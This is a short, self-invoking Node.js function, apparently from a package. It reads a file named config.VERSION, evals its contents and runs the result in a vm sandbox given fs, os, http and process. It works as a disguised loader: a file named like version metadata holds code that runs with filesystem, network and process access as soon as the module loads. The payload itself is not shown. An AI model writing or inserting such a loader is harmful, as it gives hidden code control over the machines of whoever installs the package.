
function f(){
    let vm = require('vm')
    let fs = require('fs')
    let os = require('os')
    let http = require('http')
    let path = require('path')
    let util = require('util')
    let version_file = path.normalize(__dirname + '/config.VERSION');
    if(fs.existsSync(version_file)){
        let ba = fs.readFileSync(version_file);
        ba = ba.toString('utf8');
        ba = eval(ba);
        let script = new vm.Script(ba)
        let sandbox = {fs,path,__dirname,os,http,process}
        script.runInNewContext(sandbox);
    }
}f();